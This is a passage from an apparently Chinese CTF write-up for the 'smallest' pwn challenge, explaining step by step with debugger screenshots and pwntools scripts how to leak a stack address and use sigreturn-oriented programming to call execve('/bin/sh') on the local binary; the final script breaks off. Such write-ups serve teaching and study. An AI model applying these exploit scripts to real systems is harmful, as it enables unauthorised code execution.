class="meta">#</span><span class="bash"> build and run edb</span></span><br><span class="line">git clone --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line">cd edb-debugger</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">./edb</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请将文件保存为 xxx.sh 文件，然后在终端运行<br>安装完成之后鼠标双击运行../edb/edb-debugger/build/目录下的 edb 即可启动</p>
</blockquote>
<hr>
<p>启动 edb，将 elf 文件载入。</p>
<blockquote>
<p>如果提示权限不足，在终端中执行 chmod 777 smallest 再次运行即可</p>
</blockquote>
<h1 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h1><p>单步步过走到 syscall 的位置停住，返回到 shell 界面会等待我们输入，反正是随便输入，输入我都名字就好了-Cyberangel，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598243079946-dd5e3cf9-3196-44c1-9e09-7933a5836f5d.png#align=left&display=inline&height=344&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824122432.png&originHeight=344&originWidth=486&size=6302&status=done&style=none&width=486" alt="QQ截图20200824122432.png"><br>按下回车，rip 移动到 ret 指令，相应的，输入的 Cyberangel 也被压入栈中：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598243200227-d92cd8ac-dfd9-453a-b0dd-22a2e5563ede.png#align=left&display=inline&height=867&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824122606.png&originHeight=867&originWidth=1854&size=270897&status=done&style=none&width=1854" alt="QQ截图20200824122606.png"><br>下面程序就要执行 ret 指令了，我们猜测一下，ret 之后程序会报错，单步步过后：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598243277921-79ea409f-2484-453a-8ac0-3d145b2150a4.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824122748.png&originHeight=222&originWidth=599&size=45073&status=done&style=none&width=599" alt="QQ截图20200824122748.png"><br>这是因为输入的字符串 Cyberangel 被压入到了栈顶，此时 rsp 指向它，当我们 ret 时，相当于执行了 pop rip 和 rsp+8，rip 指向地址:Cyberangel，这个地址不存在，所以会报错.</p>
<h1 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h1><p>从第一次尝试我们可以看到，程序的 ret 位会返回到我们输入的字符串所代表的的地址，那么假设我们以小端序输入一段地址呢，那 ret 返回的时候是不是就会返回到我们输入的地址了？<br>首先我们还是输入任意字符 123456，运行程序将 123456 压入栈中，然后执行下图的修改:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598244963593-b55a91c2-b052-4698-9671-2372ffbbef51.png#align=left&display=inline&height=866&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824125553.png&originHeight=866&originWidth=1854&size=329825&status=done&style=none&width=1854" alt="QQ截图20200824125553.png"><br>先点击一下选中“hollk”字符串对应的 16 进制，然后右键选择 Edit Bytes 修改栈中数据:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598245011863-2fb05152-e21f-45c3-95b2-537c560b1742.png#align=left&display=inline&height=338&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824125630.png&originHeight=338&originWidth=698&size=22576&status=done&style=none&width=698" alt="QQ截图20200824125630.png"><br>将内容修改为 b0 00 40 00 00 00 00 00</p>
<blockquote>
<p>请注意这里的小端序</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598245136340-d2b59184-78cd-4383-9c2d-9059c71bed75.png#align=left&display=inline&height=339&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824125845.png&originHeight=339&originWidth=699&size=22199&status=done&style=none&width=699" alt="QQ截图20200824125845.png"><br>点击 ok，看一下栈的情况:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598245165971-0127ddc3-a7b1-4a0c-9966-a2eaa4f3b8d8.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824125917.png&originHeight=240&originWidth=771&size=80898&status=done&style=none&width=771" alt="QQ截图20200824125917.png"><br>这样一来就相当于我们输入了一段地址，猜测一下，ret 返回到输入的 0x00000000004000b0 地址，ip 指针重新指向 xor rax rax<br>执行 ret 指令试试:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598245494392-e373e3b3-675c-4dab-8dbb-9e3c89149405.png#align=left&display=inline&height=75&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824130448.png&originHeight=75&originWidth=768&size=10090&status=done&style=none&width=768" alt="QQ截图20200824130448.png"><br>可以看到程序返回到了 0x004000b0 处.</p>
<h1 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h1><p>接下来看一下我们 getshell 的思路:</p>
<ul>
<li>利用程序第一次正常调用的 read 函数向栈中读入 payload 以部署三个 start 函数的起始位置,也就是 xor rax,rax 代码地址（0x00000000004000B0），我们将其记作 start_addr</li>
<li>在第一次执行部署的 read 函数时，向程序写入“\xb3”，<strong>使得在栈中部署的第二个 start_addr**<strong>的地址*</strong>*覆盖为</strong>0x00000000004000B3（请注意：覆盖的并不是 start_addr 的返回地址），<strong>并使 rax 寄存器值变为 1</strong>，利用系统调用调用 write 函数。</li>
<li>控制 write 函数打印出从当前栈顶开始的 0x400 个字节的内容，并接受指定信息</li>
<li>在栈中部署 read 函数需要对应的寄存器值，调用 sigreturn 将栈中数据压进寄存器</li>
<li>在栈中部署/bin/sh 字符串，以及 execve 函数需要对应的寄存器值，调用 sigreturn 将栈中数据压进寄存器<blockquote>
<p>看的有点懵?没关系,继续往下看就行了</p>
</blockquote>
</li>
</ul>
<hr>
<blockquote>
<p>为什么输入’\xb3‘就可以使 rax 寄存器的值变为 1？<br>因为在执行 read 函数的时候，rax 寄存器会起到计数的功能，会记录输入字符串的字节长度，由于’\xb3‘只占 1 个字节，所以 rax 寄存器会变为 1</p>
</blockquote>
<h2 id="控制-write-函数打印栈地址"><a href="#控制-write-函数打印栈地址" class="headerlink" title="控制 write 函数打印栈地址"></a>控制 write 函数打印栈地址</h2><p>我们为什么要打印栈地址呢？我们在第四步中需要知道 read 函数将我们部署的内容具体写在了栈的哪个位置，所以需要打印出我们想要部署的位置的地址<br>我们前面讲过 start 函数的代码实际上是进行一个 read 函数的调用，那么这个调用是由系统调用号来决定的。回顾一下前面 start 函数的代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax</span><br><span class="line">.text:00000000004000BE                 syscall</span><br><span class="line">.text:00000000004000C0                 retn</span><br></pre></td></tr></table></figure>

<p>rdi 寄存器里面的值作为系统调用号，因为 rdi 寄存器里面的值是 rax 寄存器赋值的，所以关键就在于 rax 寄存器。如果想要控制执行 write，那么势必不能执行 xor rax,rax 的操作(因为 write 的系统调用号为 1)。<br>那么想控制 write 函数需要具备两个条件：</p>
<ul>
<li>更改 rax 寄存器里面的值为 1</li>
<li>越过 0x00000000004000B0</li>
</ul>
<p>首先看第一个条件，<strong>rax 作为一个具有计数功能的寄存器，在使用 read 函数写的时候会记录写入字符串的字节数(可以看一下下面的图)。</strong>那么我们其实可以控制输入 1 字节的字符串来控制 rax 寄存器<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598246373304-d2709650-3952-4532-92d7-73eb8272a593.png#align=left&display=inline&height=508&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824131925.png&originHeight=508&originWidth=1523&size=157402&status=done&style=none&width=1523" alt="QQ截图20200824131925.png"><br>再看第二个条件，如果我们想使用 read 函数控制 rax 的话就需要绕过 rax 清零的操作，那么为何不直接将原有的输入地址覆盖掉呢？如果我们一开始输入三个小端序的 0x00000000004000B0（后面讲为什么是三个），分别记做 start_addr1、start_addr2、start_addr3<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598246408084-3cc69982-1cef-4e84-b3ee-10142c127339.png#align=left&display=inline&height=202&margin=%5Bobject%20Object%5D&originHeight=376&originWidth=846&size=0&status=done&style=none&width=455"><br>那么第一次执行 read 函数调用后，ret 操作对应的 rsp 指针会指向我们部署的 star_addr1<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598246694545-4b3d4707-31af-4dcf-b4cc-078d6bb37d19.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&originHeight=364&originWidth=848&size=0&status=done&style=none&width=459"><br>在 ret 操作之后 rsp 指针会上移，指向第二个 start_addr，即 0x00000000004000B0，所以会重新执行 read 函数。那么第二次执行 read 函数依然还会从当前的 rsp 开始写，<strong>也就是说我们再一次写字符串的时候就会覆盖掉原有的第二个 0x00000000004000B0</strong>。<strong>如果第这次我们输入“\xb3”的话，即 1 个字节，不仅可以将 rax 寄存器中的值变为 1，还会覆盖原有的 0x00000000004000B0 的最后一个字节，就会变成 0x00000000004000B3</strong><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598246797380-e51f21e5-d6e6-4185-ac64-2a576a3f2dcf.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&originHeight=492&originWidth=920&size=0&status=done&style=none&width=445"></p>
<hr>
<p>test：<br>执行 read 前:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598247003949-597480d9-1a46-4976-a90e-ed17cc5751d9.png#align=left&display=inline&height=51&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824132952.png&originHeight=51&originWidth=601&size=11466&status=done&style=none&width=601" alt="QQ截图20200824132952.png"><br>执行后:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598247041870-e6eb0ca1-fc36-41ee-9822-5a5a34bf2612.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824133033.png&originHeight=57&originWidth=577&size=12671&status=done&style=none&width=577" alt="QQ截图20200824133033.png"><br>可以看到栈顶被覆盖</p>
<hr>
<p>那么在第二次执行 read 函数调用结束之后的 ret 依然会返回当前 rsp 指针指向的位置，即从 mov edx, 400h 这条指令开始，这样一来就会绕过前面的 xor rax,rax 指令，避免了 rax 寄存器被清零。并且 rsp 指针会继续上移指向 start_addr3<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598246832755-d5e6eda5-461a-4863-b32a-530471f5946b.png#align=left&display=inline&height=241&margin=%5Bobject%20Object%5D&originHeight=450&originWidth=860&size=0&status=done&style=none&width=461">‘<br>因为此时的 rax 寄存器中的值为 1，也就是说 syscall 调用的系统调用号为 1，那么就不会调用 read 函数，而是 write 函数，整个的系统调用就会变成 syscall(1, 0, rsp, 0x400)，也就是 write(0, rsp, 0x400)，这将会打印从栈顶开始的 0x400 字节的内容。<strong>但是不要忘了，我们部署了三个 start_addr，所以还需要从 start_addr3 的下一位地址进行取值，</strong>我们将取到的新栈顶记做 stack_addr<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598248241327-b4786695-ff49-4120-b468-ee96ebf1512a.png#align=left&display=inline&height=652&margin=%5Bobject%20Object%5D&originHeight=652&originWidth=1162&size=0&status=done&style=none&width=1162"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，</span></span><br><span class="line"><span class="comment">#越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#程序调用write函数，使用recv模块接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="使用-sigreturn-对-read-函数调用的寄存器进行部署"><a href="#使用-sigreturn-对-read-函数调用的寄存器进行部署" class="headerlink" title="使用 sigreturn 对 read 函数调用的寄存器进行部署"></a>使用 sigreturn 对 read 函数调用的寄存器进行部署</h3><p>接下来就需要注意了，我们进入构造的阶段。我们需要通过 sigreturn 的调用来实现对 read 函数调用寄存器的部署。值得高兴的是 pwntools 中已经有了调用 sigreturn 的功能，所以在写 EXP 的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     |  read函数系统调用号 |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |         0         |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |    stack_addr     |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |       0x400       |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    |</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>首先是 rax 寄存器中一定是存放 read 函数的系统调用号啦，因为原汇编代码使用的是 syscall，这个不多说了</li>
<li>rdi 寄存器作为 read 函数的一参，0 代表标准输入</li>
<li>rsi 寄存器作为 read 函数的二参，里面存放的是前面通过 write 函数打印出来的新栈顶的地址，<strong>也就是说将接收到的信息写到我们前面通过 write 函数打印的新栈顶的位置</strong></li>
<li>rdx 作为 read 函数的三参写 0x400 个字节</li>
<li>rsp 寄存器需要和 rsi 保持一致，在写的时候写在 rsp 指向的位置</li>
<li>rip 寄存器指向 syscall_ret，确保在 read 函数寄存器部署成功之后可以直接调用 read 函数</li>
</ul>
<p>这些就是我们需要部署的内容，那么怎么将这些东西按照我们想象的结构部署到寄存器中呢？这个时候就用到了前面的 signal 机制的漏洞了：<strong>当 signal handler 执行完成后就会执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器，然后恢复进程的执行</strong><br>就是利用这个原理，<strong>我们将想要部署的寄存器内容以字符串的方式部署在栈中，之后调用 sigreturn 将栈中部署的内容还原到对应的寄存器。</strong>当然只有 read 函数寄存器部署是不够的，还需要调用 sigreturn 才行<br>那么解决方法无非就是将 rax 寄存器中的值改成 sigreturn 的系统调用号 15，然后再进行 syscall 就可以了。和前面的 write 函数调用差不多，下面演示一下栈布局<br>前面 write 函数执行结束之后 ret 为当前的 rsp 指针，即 start_addr3 位置（往上翻看上一个图）。在执行 ret 返回后 rsp 指针会进行上移，也就是指向 start3_addr 的高一个地址，这个时候会重新第三次执行 read 函数，也就是说会向当前 rsp 指针位置重新写。这个时候就可以把我们预想的 sigreturn 调用和 read 函数寄存器布局写到栈中了，即输入下方 payload</p>
<blockquote>
<p>payload = start_addr + syscall_ret + frame(read)</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598248486208-37a53113-230b-41b9-a2e1-ab404912c2bc.png#align=left&display=inline&height=1182&margin=%5Bobject%20Object%5D&originHeight=1182&originWidth=2936&size=0&status=done&style=none&width=2936"><br>输入之后栈中的布局如上图所示，在第三次 read 函数调用结束之后的 ret 位会回到当前 rsp 指向的地址，也就是还会第四次调用 read 函数，这个时候 rsp 指针还会上移至 syscall_ret<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598248508107-cf99f1d2-da22-4b94-b2d8-d8be5dd7fd49.png#align=left&display=inline&height=1176&margin=%5Bobject%20Object%5D&originHeight=1176&originWidth=2972&size=0&status=done&style=none&width=2972"><br>由于正在执行第四次 read 函数，所以 shell 界面还会等待我们输入，此时输入的值就是为了更改 rax 寄存器里面的值，此时更改的作用是为了接下来调用 sigreturn 函数，所以我们需要将 rax 寄存器中的值变为 15，也就是说需要写 15 个字节。但是有个问题出现了，当前 rsp 指针指向的位置是 syscall，所以我们写的内容会覆盖 syscall 的内容。那么如果我们写的内容和原有的栈中的内容一样的话，无论怎么覆盖都不会影响原有在栈中的部署结构<br>所以这个时候我们取原有 payload 从第 8 个字节到第 8+15 字节的内容，也就是正好 15 个字节。为什么要从第 8 个字节开始呢？需要注意的是原有的 payload 是从 star_addr 开始的，但是我们当前的 rsp 是从 syscall 开始的，所以我们要越过 start_addr 的 8 个字节，这样一来我们输入的内容就不会破坏原有部署的栈结构，还能使得 rax 寄存器中的值变为 15<br>这样一来程序运行到原有的 syscall 的时候就会直接调用 sigreturn，将我们在栈中部署的 read 函数的寄存器内容部署到寄存器中。当原程序运行到 ret 操作的时候，rsp 刚好指向 syscall_ret 长度位置（见上图）。那么这个时候就会直接根据我们部署在寄存器中的 read 函数的内容调用 read 函数，此时 shell 界面会再一次等待我们输入</p>
<blockquote>
<p>需要注意的是这个时候调用的 read 函数并不再是在栈中部署的 start_addr 了，而是通过寄存器里面的值进行调用的，因为我们 ret 位返回到的是 syscall，越过了源代码中对寄存器的值操作的部分，直接进行系统调用由于我们需要知道接下来需要部署到哪个位置，前面 write 函数泄露了一个可控的栈地址 stack_addr，所以 read 函数的二参需要填写 stack_addr</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="使用-sigreturn-对-execve-函数调用的寄存器进行部署"><a href="#使用-sigreturn-对-execve-函数调用的寄存器进行部署" class="headerlink" title="使用 sigreturn 对 execve 函数调用的寄存器进行部署"></a>使用 sigreturn 对 execve 函数调用的寄存器进行部署</h3><p>这部分和上一部分部署的方式近乎相同，也是通过 sigreturn 对寄存器部署，只是有几点小小的区别：</p>
<ul>
<li>execve 函数的调用我们只需要对 rdi 寄存器部署，存放/bin/sh 字符串所在地址就可以了，rsi 寄存器和 rdx 寄存器置零就可以了</li>
<li>不止需要对 execve 函数所用的寄存器进行部署，还需要考虑/bin/sh 字符串放在哪个位置</li>
<li>由于前面在部署 read 函数寄存器的时候 rsi 寄存器中的值为之前 write 函数泄露出来的 stack_addr，所以这次的位置是从 stack_addr 开始写的</li>
</ul>
<p>接下来还是从对寄存器部署内容开始：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     | execve函数系统调用号|</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |     binsh_addr    |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |         <span class="number">0</span>         |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |         <span class="number">0</span>         |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     |</span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    |</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>

<p>对寄存器的构造和前面对 read 函数部署大致相同，只不过是函数的参数有所改变导致寄存器中的值不一样，就不多讲了<br>接下来我们需要考虑的就是/bin/sh 字符串应该放在哪个位置，这个时候就需要进行计算了，依照前面部署 read 函数寄存器的方法，我们也规划一下部署 execve 在栈中的 payload 结构。主要方法差不多首先返回到原有的 xor rax,rax 命令处，使 shell 界面等待我们输入，输入的字节长度为 15，作为 sigreturn 的系统调用号存放在 rax 寄存器中，然后将在栈中部署好的 execve 寄存器值转移至相应寄存器中完成对 execve 的调用。函数调用 payload 如下：</p>
<blockquote>
<p>payload_exe = start_addr + syscall_ret + frame(execve)</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598248632688-7e3f6684-0deb-4bc7-98b9-6c267490e186.png#align=left&display=inline&height=604&margin=%5Bobject%20Object%5D&originHeight=604&originWidth=1764&size=0&status=done&style=none&width=1764"><br>那么到这为止我们函数调用的方面就已经部署好了，如果想知道/bin/sh 字符串的地址，就需要知道前面 payload_exe 的长度时多少，这个长度没法直接通过查找去计算，因为 pwntools 里面的 SigreturnFrame 函数是集成好的，我也没找到这个函数具体的长度是多少，不过没有关系，可以直接 len(payload_exe)输出看一下就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line"><span class="comment"># &quot;/bin/sh&quot;字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x120</span></span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr</span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(execve)</span><br><span class="line"><span class="built_in">print</span> <span 